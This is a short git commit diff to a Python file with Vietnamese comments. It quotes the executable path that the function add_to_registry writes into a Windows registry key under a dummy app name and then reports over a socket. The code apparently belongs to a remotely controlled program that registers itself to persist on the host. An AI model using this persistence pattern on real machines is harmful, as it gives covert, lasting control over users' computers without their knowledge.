efd9d15f683243a8cad514728eded3b05c765c6f
TheVriss <thevriss@gmail.com>
2024-10-28 00:41:02 +0700

    Fix reg value

--- main.py
+++ main.py
@@ -11,12 +11,13 @@ def add_to_registry(sock):
     app_name = 'HelloDummy'
     # Lấy đường dẫn đến tệp thực thi
     exe_path = os.path.abspath(sys.executable)  # Sử dụng sys.executable để lấy đường dẫn tệp .exe
+    exe_path_quoted = f'"{exe_path}"' if ' ' in exe_path else exe_path
     # Mở khóa Registry với quyền ghi
     try:
         with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as registry_key:
             # Thêm hoặc cập nhật giá trị mới
-            reg.SetValueEx(registry_key, app_name, 0, reg.REG_SZ, exe_path)
-            response = f"Added or updated {app_name} to Registry with path: {exe_path}\n"
+            reg.SetValueEx(registry_key, app_name, 0, reg.REG_SZ, exe_path_quoted)
+            response = f"Added or updated {app_name} to Registry with path: {exe_path_quoted}\n"
             time.sleep(1)
             sock.sendall(response.encode())
     except Exception as e:
